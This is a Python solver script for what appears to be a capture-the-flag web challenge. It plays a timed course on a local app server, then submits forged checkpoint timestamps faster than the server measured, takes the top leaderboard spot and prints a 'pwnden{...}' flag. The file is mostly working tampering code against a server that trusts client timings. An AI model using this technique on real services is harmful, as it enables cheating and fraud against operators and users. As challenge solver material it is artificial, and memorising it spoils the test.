"""Run the course once, then submit a record that is faster than the server measured."""
from http.cookiejar import CookieJar
import json
import re
import time
from urllib.error import HTTPError
from urllib.request import build_opener, HTTPCookieProcessor, Request

STARS = 6
GAP_SECONDS = 2.05


class Client:
    def __init__(self, base='http://app:8000'):
        self.base = base
        self.opener = build_opener(HTTPCookieProcessor(CookieJar()))

    def request(self, path, body=None):
        request = Request(self.base + path, data=json.dumps(body).encode() if body is not None else None,
                          headers={'Accept': 'application/json', 'Content-Type': 'application/json'})
        try:
            with self.opener.open(request, timeout=5) as response:
                return response.status, json.loads(response.read())
        except HTTPError as error:
            return error.code, json.loads(error.read())


def run_course(client):
    status, run = client.request('/api/run/start', {})
    assert status == 200
    marks = []
    for number in range(1, STARS + 1):
        time.sleep(GAP_SECONDS)
        status, mark = client.request('/api/run/checkpoint', {'run_id': run['run_id'], 'id': number})
        assert status == 200 and mark['id'] == number
        marks.append(mark['t_ms'])
    return run['run_id'], marks


def solve():
    client = Client()
    status, track = client.request('/api/track')
    assert status == 200 and 'trophy' not in track and track['best_ms'] is None
    assert track['rules'] == {'stars': 6, 'segment_m': 20, 'max_speed': 10}
    run_id, marks = run_course(client)
    assert marks[0] >= 2000 and all(later - earlier >= 2000 for earlier, later in zip(marks, marks[1:]))
    limit = STARS * 20 * 1000 // 10
    assert marks[-1] >= limit
    forged = [{'id': number, 't_ms': number * 1000} for number in range(1, STARS + 1)]
    status, result = client.request('/api/run/finish', {'run_id': run_id, 'checkpoints': forged})
    if status != 200:
        assert status == 422
        raise SystemExit(3)
    assert result['best_ms'] == 6000 and result['leaderboard'][0]['mine']
    trophy = result['trophy']
    assert re.fullmatch(r'pwnden\{[0-9a-f]{32}\}', trophy)
    other = Client()
    status, fresh = other.request('/api/track')
    assert status == 200 and 'trophy' not in fresh and fresh['best_ms'] is None
    print(trophy)


if __name__ == '__main__':
    solve()
